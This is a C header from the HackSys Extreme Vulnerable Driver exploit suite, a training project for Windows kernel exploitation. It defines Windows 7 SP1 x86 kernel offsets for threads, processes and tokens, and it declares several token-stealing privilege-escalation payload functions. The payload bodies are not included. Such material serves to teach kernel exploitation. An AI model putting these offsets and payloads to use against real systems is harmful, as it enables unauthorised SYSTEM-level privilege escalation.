#pragma once
/*++

		  ##     ## ######## ##     ## ########
		  ##     ## ##       ##     ## ##     ##
		  ##     ## ##       ##     ## ##     ##
		  ######### ######   ##     ## ##     ##
		  ##     ## ##        ##   ##  ##     ##
		  ##     ## ##         ## ##   ##     ##
		  ##     ## ########    ###    ########

		HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]payatu[dot]com
Website: http://www.payatu.com/

Copyright (C) 2011-2016 Payatu Technologies Pvt. Ltd. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
	Payloads.h

Abstract:
	This module implements the data structures used by EoP payload.

--*/

#ifndef __PAYLOAD_H__
#define __PAYLOADS_H__

#pragma once

#include "Common.h"

// Windows 7 SP1 x86 Offsets
#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID

VOID    TokenStealingPayloadWin7();
VOID    TokenStealingPayladGSWin7();
VOID    TokenStealingPayloadWin7New();
VOID    TokenStealingPayloadWin7Generic();
VOID    TokenStealingPayloadDuplicateToken();
VOID    TokenStealingPayloadPoolOverflowWin7();
VOID    TokenStealingPayloadPsReferencePrimaryToken();

#endif //__PAYLOAD_H__
